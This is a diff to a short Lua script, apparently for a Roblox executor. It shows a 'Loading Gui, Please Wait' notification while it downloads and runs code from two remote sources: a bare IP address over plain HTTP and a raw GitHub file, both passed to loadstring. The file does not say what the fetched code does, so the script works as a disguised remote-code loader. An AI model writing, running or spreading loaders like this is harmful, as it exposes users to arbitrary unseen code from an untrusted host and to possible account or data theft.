@@ -1,2 +1,15 @@
+local function Dark()   
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Loading Gui",
+    Text = "Please Wait",
+    Duration = 8
+})
 ID="7ada2f70-07ff-4d15-8206-e39f7501ce5f";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/Loading'))()
+end
+
+task.spawn(Dark)
+task.spawn(loadui)
